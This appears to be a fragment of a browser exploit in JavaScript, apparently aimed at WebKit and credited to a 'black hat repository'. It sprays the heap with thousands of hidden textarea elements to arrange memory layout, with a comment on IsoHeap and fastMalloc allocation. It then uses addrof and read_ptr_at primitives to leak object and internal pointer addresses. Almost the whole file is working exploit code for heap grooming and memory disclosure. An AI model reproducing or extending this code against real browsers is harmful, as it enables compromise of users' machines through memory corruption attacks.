// code from the black hat repository

function sprayHTMLTextArea() {
	textarea_div_elem = document.createElement("div");
	document.body.appendChild(textarea_div_elem);
	textarea_div_elem.id = "div1";
	var element = document.createElement("textarea");

	/* Add a style to avoid textarea display */
	element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';

	/*
	 * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
	 * allocation of the node attributes and an IsoHeap allocation of the
	 * Element. The virtual page layout will look something like that:
	 * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
	 */
	for (let i = 0; i < 0x6000; i++)
		textarea_div_elem.appendChild(element.cloneNode());
}

// end copy-paste

sprayHTMLTextArea();

var pr_buf = '';
function buf_print(s, last)
{
    pr_buf += s + '\n';
}

function dumpAddresses()
{
    for(var i = 0; i < textarea_div_elem.childNodes.length; i++)
    {
        var addr1 = addrof(textarea_div_elem.childNodes[i]);
        var addr2 = read_ptr_at(addr1 + 0x18);
        buf_print(i+" 0x"+(new Number(addr1)).toString(16)+" 0x"+(new Number(addr2)).toString(16), i == textarea_div_elem.childNodes.length - 1);
    }
}

dumpAddresses();

print(pr_buf);
